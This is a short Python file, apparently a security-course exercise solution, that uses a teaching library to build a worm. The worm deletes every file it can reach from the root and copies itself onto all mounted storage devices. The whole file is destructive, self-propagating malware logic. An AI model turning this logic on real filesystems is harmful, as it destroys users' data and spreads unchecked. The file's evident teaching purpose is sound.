# Implement a worm that deletes all files on the system and propagates itself
# to the root directory and to all storage devices.
#
# Note: follow the instructions in "utils/create_fs.py"

from issp import Malware, Payload, Propagation, System, log


class DeleteFiles(Payload):
    def execute(self, system: System) -> None:
        for path in system.path("/").walk():
            if path != system.own_path:
                log.info("Removing: %s", path)
                path.remove()


class StorageWorm(Propagation):
    def propagate(self, system: System) -> None:
        code = system.own_path.read_bytes()
        for path in system.path("/").walk():
            if path.is_mount():
                copy_path = path / "worm.py"
                log.info("Propagating to: %s", copy_path)
                copy_path.write_bytes(code)


def main() -> None:
    malware = Malware(payload=DeleteFiles(), propagation=StorageWorm())
    malware.execute()


if __name__ == "__main__":
    main()
